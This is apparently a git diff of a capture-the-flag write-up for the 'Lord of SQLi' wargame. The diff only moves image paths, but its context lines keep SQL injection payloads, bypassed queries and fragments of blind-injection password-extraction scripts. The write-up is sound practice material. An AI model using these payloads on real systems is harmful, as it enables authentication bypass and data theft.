@@ -3,7 +3,7 @@
 
 
 ## Gremlin
-![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Gremlin.png)
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/images/Gremlin.png)
 Solution:
 
 Using ?id=1&pw=1%27%20or%201%23 would result the query execute.
@@ -14,7 +14,7 @@ link: https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php?i
 
 ## Cobolt
 
-![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Cobolt.png)
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/images/Cobolt.png)
 
 query : select id from prob_cobolt where id='' or id='admin' #' and pw=md5('')
 
@@ -22,7 +22,7 @@ link:https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php?id=
 
 ## Goblin
 
-![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Goblin.png)
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/images/Goblin.png)
 
 query : select id from prob_goblin where id='guest' and no=1 or 1 limit 1,1
 
@@ -30,7 +30,7 @@ link: https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php?no
 
 
 ## Orc
-![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Orc.png)
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/images/Orc.png)
 
 
 Script:
@@ -71,7 +71,7 @@ Script:
 
 Output:
 
-![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Orcans.png)
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/images/Orcans.png)
 
 Try the password in the url by setting it to the argument 'pw'
 
@@ -79,7 +79,7 @@ like:  ?pw=09509852
 
 ## Wolfman
 
-![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Wolfman.png)
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/images/Wolfman.png)
 
 link: https://los.rubiya.kr/chall/wolfman_4fdc56b75971e41981e3d1e2fbe9b7f7.php?pw=%27%09or%09id=%27admin%27%23
 
@@ -87,7 +87,7 @@ query : select id from prob_wolfman where id='guest' and pw='' or id='admin'#'
 
 ## Darkelf
 
-![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Darkelf.png)
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/images/Darkelf.png)
 
 link: https://los.rubiya.kr/chall/darkelf_c6a5ed64c4f6a7a5595c24977376136b.php?pw=%27%20||%20id=%27admin%27%23
 
@@ -95,7 +95,7 @@ query : select id from prob_darkelf where id='guest' and pw='' || id='admin'#'
 
 ## Orge
 
-![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Orge.png)
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/images/Orge.png)
 
 Script:
 
@@ -136,7 +136,7 @@ Script:
                         print("\t",chr(int(bits,2)))
                     print("Password:"+password)
 
-![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Orgeans.png)
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/images/Orgeans.png)
 
 Try the password in the url by setting it to the argument 'pw'
 
@@ -145,7 +145,7 @@ like:  ?pw=7b751aec
 
 ## Troll
 
-![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Troll.png)
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/images/Troll.png)
 
 query : select id from prob_troll where id='a\dmin'
 
@@ -153,7 +153,7 @@ Link: https://los.rubiya.kr/chall/troll_05b5eb65d94daf81c42dd44136cb0063.php?id=
 
 ## Vampire
 
-![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Vampire.png)
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/images/Vampire.png)
 
 Link: https://los.rubiya.kr/chall/vampire_e3f1ef853da067db37f342f3a1881156.php?id=adadminmin
 
@@ -161,7 +161,7 @@ query : select id from prob_vampire where id='admin'
 
 ## Skeleton
 
-![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Skeleton.png)
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/images/Skeleton.png)
 
 query : select id from prob_skeleton where id='guest' and pw='' or id='admin'#' and 1=0
 
@@ -169,7 +169,7 @@ Link: https://los.rubiya.kr/chall/skeleton_a857a5ab24431d6fb4a00577dac0f39c.php?
 
 ## Golem
 
-![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Golem.png)
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/images/Golem.png)
 
 Script:
 
@@ -211,7 +211,7 @@ Script:
                     print("Password:"+password)
 
 
-![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Golemans.png)
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/images/Golemans.png)
 
 Try the password in the url by setting it to the argument 'pw'
 
@@ -220,7 +220,7 @@ like:  ?pw=77d6290b
 
 ## Darkknight
 
-![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Darkknight.png)
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/images/Darkknight.png)
 
 Script:
 
@@ -262,7 +262,7 @@ Script:
                     print("Password:"+password)
 
 
-![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Darkknightans.png)
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/images/Darkknightans.png)
 
 Try the password in the url by setting it to the argument 'pw'
 
@@ -271,7 +271,7 @@ like:  ?pw=0b70ea1f
 
 ## Bugbear
 
-![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Bugbear.png)
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/images/Bugbear.png)
 
 Script:
 
@@ -317,7 +317,7 @@ Script:
 
 
 
-![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Bugbearans.png)
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/images/Bugbearans.png)
 
 Try the password in the url by setting it to the argument 'pw'
 
@@ -326,7 +326,7 @@ like:  ?pw=52dc3991
 
 ## Giant
 
-![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Giant.png)
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/images/Giant.png)
 
 query : select 1234 fromprob_giant where 1
 
@@ -334,7 +334,7 @@ Link: https://los.rubiya.kr/chall/giant_18a08c3be1d1753de0cb157703f75a5e.php?shi
 
 ## Assassin
 
-![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Assassin.png)
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/images/Assassin.png)
 
 
 Script:
@@ -371,7 +371,7 @@ Script:
                         password+='_'
                 print(password)
 
-![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Assassinans.png)
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/images/Assassinans.png)
 
 Try the password in the url by setting it to the argument 'pw'
 
@@ -382,7 +382,7 @@ like:
 
 ## Succubus
 
-![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Succubus.png)
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/images/Succubus.png)
 
 Link: https://los.rubiya.kr/chall/succubus_37568a99f12e6bd2f097e8038f74d768.php?id=\&pw=%20or%201%23
 
@@ -390,7 +390,7 @@ query : select id from prob_succubus where id='\' and pw=' or 1#'
 
 ## Zombie_assassin
 
-![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Zombie_assassin.png)
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/images/Zombie_assassin.png)
 
 query : select id from prob_zombie_assassin where id='"\' and pw='or 1=1 #'
 
@@ -399,7 +399,7 @@ Link: https://los.rubiya.kr/chall/zombie_assassin_eac7521e07fe5f298301a44b61ffee
 
 ## Nightmare
 
-![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Nightmare.png)
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/images/Nightmare.png)
 
 query : select id from prob_nightmare where pw=('')=0') and id!='admin'
 
@@ -407,7 +407,7 @@ https://los.rubiya.kr/chall/nightmare_be1285a95aa20e8fa154cb977c37fee5.php?pw=%2
 
 ## Xavis
 
-![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Xavis.png)
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/images/Xavis.png)
 
 Script:
 
@@ -448,7 +448,7 @@ Script:
                 print("\t",chr(int(bits,2)))
             print("Password:"+password)
 
-![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Xavisans.png)
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/images/Xavisans.png)
 
 Try the password in the url by setting it to the argument 'pw'
 
@@ -458,7 +458,7 @@ like:
 
 ## Dragon
 
-![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Dragon.png)
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/images/Dragon.png)
 
 query : select id from prob_dragon where id='guest'# and pw=' and 0 or id='admin'#'
 
